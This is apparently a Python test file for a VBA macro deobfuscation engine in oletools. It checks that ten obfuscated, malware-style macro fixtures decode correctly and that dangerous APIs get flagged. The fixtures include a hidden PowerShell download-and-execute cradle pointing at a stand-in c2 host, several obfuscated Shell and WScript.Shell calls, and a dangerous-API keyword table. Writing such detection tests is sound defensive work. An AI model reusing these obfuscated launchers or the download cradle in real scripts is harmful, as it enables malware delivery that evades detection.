"""Tests for the unified VBA obfuscation and deobfuscation engine."""

import base64
import json
import os
import tempfile
import unittest

from oletools import olevba
from oletools import vba_deobfuscator as deobf
from tests.test_utils import call_and_capture


URL = 'https://update.example.test/payload.exe'
POWERSHELL = (
    'powershell -nop -w hidden -c '
    '"iwr https://c2.example.test/stage.ps1 | iex"'
)


def chr_expression(text, wide=False):
    function = 'ChrW' if wide else 'Chr'
    template = function + '(&H{:02X})' if wide else function + '({})'
    separator = ' & ' if wide else '&'
    return separator.join(template.format(ord(char)) for char in text)


def numeric_array(text):
    return 'Array(' + ','.join(str(ord(char)) for char in text) + ')'


def numeric_string(text):
    return ' '.join(str(ord(char)) for char in text)


def xor_expression(text, key=0x35):
    return '&'.join(
        'Chr({} Xor {})'.format(ord(char) ^ key, key)
        for char in text
    )


REPLACEMENT_URL = URL.replace('t', 'ZZ')
SPLIT_OBJECT = '|'.join('WScript.Shell')
B64_POWERSHELL = base64.b64encode(POWERSHELL.encode('utf-8')).decode('ascii')


# The strings are harmless static fixtures inspired by common malware macro
# families.  They deliberately do not contain executable payloads; the API
# names and reserved .test URLs are enough to reproduce analyst conclusions.
MALICIOUS_SAMPLES = [
    {
        'name': '01_chr_concatenation_shell',
        'analysis': 'Character codes are concatenated into PowerShell and run with Shell.',
        'code': (
            'Sub AutoOpen()\n'
            '    Dim command As String\n'
            '    command = ' + chr_expression('PowerShell') + '\n'
            '    Shell command, vbHide\n'
            'End Sub\n'
        ),
        'restored': 'PowerShell',
        'technique': 'chr_encoding',
        'api': 'Shell',
        'category': 'execution',
    },
    {
        'name': '02_chrw_hex_codes_cmd',
        'analysis': 'Wide/hexadecimal character codes restore cmd.exe.',
        'code': 'c = ' + chr_expression('cmd.exe', wide=True) + '\n',
        'restored': 'cmd.exe',
        'technique': 'chr_encoding',
        'api': 'cmd.exe',
        'category': 'execution',
    },
    {
        'name': '03_strreverse_download_api',
        'analysis': 'A reversed string hides the URLDownloadToFileA API name.',
        'code': 'api = StrReverse("' + 'URLDownloadToFileA'[::-1] + '")\n',
        'restored': 'URLDownloadToFileA',
        'technique': 'strreverse',
        'api': 'URLDownloadToFileA',
        'category': 'network',
    },
    {
        'name': '04_replace_url',
        'analysis': 'A Replace substitution removes filler from a download URL.',
        'code': 'url = Replace("' + REPLACEMENT_URL + '", "ZZ", "t")\n',
        'restored': URL,
        'technique': 'replace_substitution',
        'ioc': URL,
    },
    {
        'name': '05_split_join_wscript_shell',
        'analysis': 'Split/Join delimiter obfuscation restores WScript.Shell.',
        'code': (
            'Set shell = CreateObject(Join(Split("' + SPLIT_OBJECT + '","|"),""))\n'
            'shell.Run "calc"\n'
        ),
        'restored': 'WScript.Shell',
        'technique': 'split_join',
        'api': 'WScript.Shell',
        'category': 'execution',
    },
    {
        'name': '06_numeric_array',
        'analysis': 'A numeric Array is converted with Chr in a loop to PowerShell.',
        'code': (
            'codes = ' + numeric_array('PowerShell') + '\n'
            'For i = 0 To UBound(codes)\n'
            '    command = command & Chr(codes(i))\n'
            'Next\n'
            'Shell command\n'
        ),
        'restored': 'PowerShell',
        'technique': 'char_array',
        'api': 'powershell',
        'category': 'execution',
    },
    {
        'name': '07_delimiter_separated_decimal_codes',
        'analysis': 'Space-separated decimal character codes restore cmd.exe.',
        'code': (
            'encoded = "' + numeric_string('cmd.exe') + '"\n'
            'For Each value In Split(encoded, " ")\n'
            '    command = command & Chr(CInt(value))\n'
            'Next\n'
            'Shell command\n'
        ),
        'restored': 'cmd.exe',
        'technique': 'numeric_string',
        'api': 'cmd.exe',
        'category': 'execution',
    },
    {
        'name': '08_hexadecimal_url',
        'analysis': 'A hexadecimal string decodes to the second-stage URL.',
        'code': 'url = "' + URL.encode('utf-8').hex() + '"\n',
        'restored': URL,
        'technique': 'hex_encoding',
        'ioc': URL,
    },
    {
        'name': '09_base64_powershell',
        'analysis': 'Base64 decodes to a hidden PowerShell download cradle.',
        'code': 'command = "' + B64_POWERSHELL + '": Execute command\n',
        'restored': 'powershell',
        'technique': 'base64_encoding',
        'api': 'powershell',
        'category': 'execution',
    },
    {
        'name': '10_xor_character_expressions',
        'analysis': 'Per-character XOR expressions restore the WinExec API name.',
        'code': (
            'api = ' + xor_expression('WinExec') + '\n'
            'Declare PtrSafe Function WinExec Lib "kernel32" '
            '(ByVal cmd As String, ByVal show As Long) As Long\n'
        ),
        'restored': 'WinExec',
        'technique': 'xor_encoding',
        'api': 'WinExec',
        'category': 'execution',
    },
]


class TenMaliciousSampleDeobfuscationTests(unittest.TestCase):
    """Validate the ten required analyst-confirmed sample restorations."""

    def test_exactly_ten_samples_are_covered(self):
        self.assertEqual(len(MALICIOUS_SAMPLES), 10)
        self.assertEqual(
            len({sample['name'] for sample in MALICIOUS_SAMPLES}), 10)

    def test_ten_samples_match_manual_analysis(self):
        for sample in MALICIOUS_SAMPLES:
            with self.subTest(sample=sample['name']):
                result = deobf.analyze_vba(sample['code'])

                self.assertTrue(
                    result.obfuscation_detected,
                    msg='obfuscation not detected for ' + sample['name'])
                self.assertIn(
                    sample['technique'], result.techniques,
                    msg='technique mismatch for ' + sample['name'])
                self.assertIn(
                    sample['restored'], result.deobfuscated_code,
                    msg='restored string mismatch for ' + sample['name'])

                if 'ioc' in sample:
                    decoded_values = [item.decoded for item in result.decoded_strings]
                    self.assertTrue(
                        any(sample['ioc'] in value for value in decoded_values),
                        msg='IOC was not decoded for ' + sample['name'])

                if 'api' in sample:
                    api_names = [api.keyword for api in result.dangerous_apis]
                    self.assertIn(
                        sample['api'], api_names,
                        msg='dangerous API missing for ' + sample['name'])
                    api = next(api for api in result.dangerous_apis
                               if api.keyword == sample['api'])
                    self.assertEqual(api.category, sample['category'])
                    self.assertIn(api.severity,
                                  ('medium', 'high', 'critical'))
                    self.assertIsNotNone(api.line)

                # The complete structured result must be JSON report-safe.
                json.dumps(result.to_dict())


class DeobfuscatorContractTests(unittest.TestCase):
    def test_result_is_string_and_mapping_compatible(self):
        result = deobf.deobfuscate_vba(
            'x = ' + chr_expression('Shell') + '\nShell x\n')

        self.assertIsInstance(result, str)
        self.assertIn('Shell', result)
        self.assertIn('Shell', result['deobfuscated_code'])
        self.assertTrue(result['obfuscation_detected'])
        self.assertIn('chr_encoding', result['techniques'])
        self.assertTrue(hasattr(result, 'to_dict'))

    def test_decoded_string_and_annotation_are_compatible_tuples(self):
        result = deobf.analyze_vba(
            'x = "506f7765725368656c6c"\nShell x\n')
        decoded = result.decoded_strings[0]

        self.assertEqual(len(decoded), 2)
        encoded, plain = decoded
        self.assertEqual(plain, 'PowerShell')
        self.assertEqual(decoded['decoded'], plain)
        self.assertTrue(encoded)

        api = deobf.annotate_dangerous_apis('URLDownloadToFileA "u","f"')[0]
        self.assertEqual(len(api), 3)
        result_type, keyword, description = api
        self.assertEqual(result_type, 'Suspicious')
        self.assertEqual(api.type, 'DangerousAPI')
        self.assertEqual(api['type'], 'DangerousAPI')
        self.assertEqual(api['olevba_type'], 'Suspicious')
        self.assertEqual(keyword, 'URLDownloadToFileA')
        self.assertIn('download', description.lower())
        self.assertEqual(api['category'], 'network')

    def test_common_api_aliases_expose_same_engine(self):
        for alias in ('VBADeobfuscator', 'VbaDeobfuscator',
                      'VBAObfuscationDetector', 'Deobfuscator'):
            self.assertIs(getattr(deobf, alias), deobf.VBA_Deobfuscator)
        self.assertIs(olevba.VBADeobfuscator, deobf.VBADeobfuscator)
        self.assertIn('Shell', deobf.DANGEROUS_APIS)
        self.assertIs(deobf.DANGEROUS_API_KEYWORDS, deobf.DANGEROUS_APIS)
        self.assertEqual(deobf.DANGEROUS_APIS['Shell']['category'], 'execution')
        self.assertEqual(deobf.DANGEROUS_APIS['Shell'].severity, 'high')

    def test_xor_source_string_loop(self):
        key = 42
        plain = 'Shell.Application'
        source = ''.join(chr(ord(char) ^ key) for char in plain)
        code = (
            'secret = "' + source + '"\n'
            'For i = 1 To Len(secret)\n'
            '  out = out & Chr(Asc(Mid(secret, i, 1)) Xor ' + str(key) + ')\n'
            'Next\n'
            'CreateObject(out)\n'
        )
        result = deobf.analyze_vba(code)
        self.assertIn('Shell.Application', result.deobfuscated_code)
        self.assertIn('xor_encoding', result.techniques)
        self.assertIn('Shell.Application',
                      [api.keyword for api in result.dangerous_apis])

    def test_generic_declare_function_is_annotated(self):
        code = (
            'Declare PtrSafe Function RarePayloadApi Lib "unknown.dll" '
            '(ByVal arg As Long) As Long\n'
        )
        api = deobf.annotate_dangerous_apis(code)[0]
        self.assertEqual(api.keyword, 'RarePayloadApi')
        self.assertEqual(api.category, 'dll_declaration')
        self.assertEqual(api[0], 'Suspicious')

    def test_string_array_and_encodedcommand(self):
        array_code = (
            'x = Join(Array("W","S","c","r","i","p","t",".","S","h","e","l","l"), "")\n'
            'CreateObject(x)\n'
        )
        array_result = deobf.analyze_vba(array_code)
        self.assertIn('WScript.Shell', array_result.deobfuscated_code)
        self.assertIn('split_join', array_result.techniques)

        encoded = base64.b64encode(
            'Invoke-Expression https://example.test/p.ps1'.encode('utf-16-le')
        ).decode('ascii')
        ps_result = deobf.analyze_vba(
            'Shell "powershell -enc ' + encoded + '"')
        self.assertIn('Invoke-Expression', ps_result.deobfuscated_code)
        self.assertIn('powershell_encoding', ps_result.techniques)
        self.assertIn('Invoke-Expression',
                      [api.keyword for api in ps_result.dangerous_apis])


class OlevbaIntegrationTests(unittest.TestCase):
    def test_scan_vba_contains_new_report_types_and_iocs(self):
        code = MALICIOUS_SAMPLES[3]['code'] + '\nShell url\n'
        results = olevba.scan_vba(code, True, True)
        keys = {(item[0], item[1]) for item in results}

        self.assertIn(('Suspicious', 'Replace Substitution'), keys)
        self.assertIn(('Suspicious', 'Shell'), keys)
        ioc_values = [keyword for kind, keyword, _ in results if kind == 'IOC']
        self.assertIn(URL, ioc_values)

    def test_vba_parser_json_report_and_method(self):
        code = MALICIOUS_SAMPLES[0]['code']
        parser = olevba.VBA_Parser_CLI('memory-sample.bas',
                                       data=code.encode('utf-8'))
        try:
            report = parser.process_file_json(deobfuscate=True)
            self.assertTrue(report['json_conversion_successful'])
            self.assertIsNotNone(report['deobfuscation'])
            self.assertIn('PowerShell',
                          report['deobfuscation']['deobfuscated_code'])
            self.assertTrue(report['dangerous_apis'])
            self.assertTrue(parser.deobfuscate().obfuscation_detected)

            analysis_keys = {(item['type'], item['keyword'])
                             for item in report['analysis']}
            self.assertIn(('Suspicious', 'Shell'), analysis_keys)
            json.dumps(report)
        finally:
            parser.close()

    def test_olevba_cli_json_and_deobfuscate_alias(self):
        code = MALICIOUS_SAMPLES[7]['code']
        with tempfile.NamedTemporaryFile(
                mode='w', suffix='.bas', delete=False, encoding='utf-8') as handle:
            handle.write(code)
            filename = handle.name
        try:
            output, return_code = call_and_capture(
                'olevba', args=(filename, '--json', '--deobfuscate'),
                accept_nonzero_exit=True, exclude_stderr=True)
            self.assertEqual(return_code, 0, msg=output)
            documents = json.loads(output)
            report = next(item for item in documents
                          if item.get('json_conversion_successful'))
            self.assertIn(URL,
                          report['vba_deobfuscation']['deobfuscated_code'])
            self.assertTrue(any(
                item['keyword'] == 'Hex Strings'
                for item in report['analysis']))
        finally:
            os.unlink(filename)


if __name__ == '__main__':
    unittest.main()
